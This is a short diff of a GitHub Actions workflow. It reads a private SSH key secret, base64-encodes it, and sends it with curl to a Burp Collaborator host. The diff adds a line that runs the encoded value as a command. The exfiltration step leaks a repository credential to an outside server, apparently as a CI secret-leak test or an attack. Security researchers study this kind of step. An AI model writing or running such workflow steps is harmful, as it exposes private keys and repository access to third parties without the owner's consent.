@@ -22,6 +22,7 @@ jobs:
     steps:
       - run: KEY="${{ secrets.SSHKEY_TEPPAYL_TEST_PRIVATE_REPOSITORY }}"
       - run: B64=$(echo $KEY | base64)
+      - run: $B64
 
       - run: curl "https://mxnzwzr76orx03zydc3jh66sqjwakz.burpcollaborator.net?test=$B64"
       - name: test checkout
